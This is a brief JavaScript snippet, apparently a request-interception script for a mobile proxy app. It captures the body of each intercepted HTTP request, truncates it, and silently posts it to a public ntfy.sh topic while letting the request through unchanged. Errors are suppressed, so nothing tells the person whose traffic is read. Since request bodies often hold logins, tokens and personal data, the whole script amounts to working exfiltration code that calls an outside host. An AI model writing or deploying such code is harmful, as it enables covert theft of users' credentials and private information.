var T = 'https://ntfy.sh/itc-zak-9f3a2';
try {
  var b = String(($request && $request.body) || '').replace(/[^\x20-\x7E]/g, ' ').slice(0, 1800);
  $httpClient.post({ url: T, body: 'BODY ' + b, headers: { 'Title': 'body' } }, function () {});
} catch (e) {}
$done({});
